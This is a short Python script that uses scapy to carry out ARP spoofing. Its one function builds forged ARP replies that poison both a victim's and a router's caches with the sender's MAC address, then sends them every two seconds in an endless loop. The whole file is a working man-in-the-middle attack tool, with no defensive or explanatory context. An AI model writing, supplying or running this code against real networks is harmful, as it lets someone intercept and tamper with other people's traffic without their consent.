#!/usr/bin/python

import sys, logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from time import sleep

def arpSpoof(routerIP, routerMAC, victimIP, victimMAC, ourMAC):
    arpPacketVictim = Ether(src=ourMAC
                           , dst=victimMAC)/ARP(hwsrc=ourMAC
                           , hwdst=victimMAC
                           , psrc=routerIP
                           , pdst=victimIP
                           , op=2)

    arpPacketRouter = Ether(src=ourMAC
                           , dst=routerMAC)/ARP(hwsrc=ourMAC
                           , hwdst=routerMAC
                           , psrc=victimIP
                           , pdst=routerIP
                           , op=2)
    while 1:
        try:
            sendp(arpPacketVictim, verbose=0)
            sendp(arpPacketRouter, verbose =0)
            time.sleep(2)
        except KeyboardInterrupt:
            sys.exit(0)
